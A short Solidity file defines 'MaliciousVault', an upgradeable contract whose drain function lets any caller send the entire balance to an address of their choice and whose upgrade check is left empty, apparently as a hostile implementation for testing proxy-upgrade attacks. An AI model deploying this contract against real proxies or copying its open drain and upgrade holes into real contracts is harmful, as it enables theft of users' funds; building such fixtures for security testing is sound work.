// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {UUPSUpgradeable} from "@openzeppelin/contracts/proxy/utils/UUPSUpgradeable.sol";

contract MaliciousVault is UUPSUpgradeable {
    function drain(address recipient) external {
        (bool success, ) = payable(recipient).call{
            value: address(this).balance
        }("");

        require(success, "Transfer failed");
    }

    function _authorizeUpgrade(address) internal override {}
}
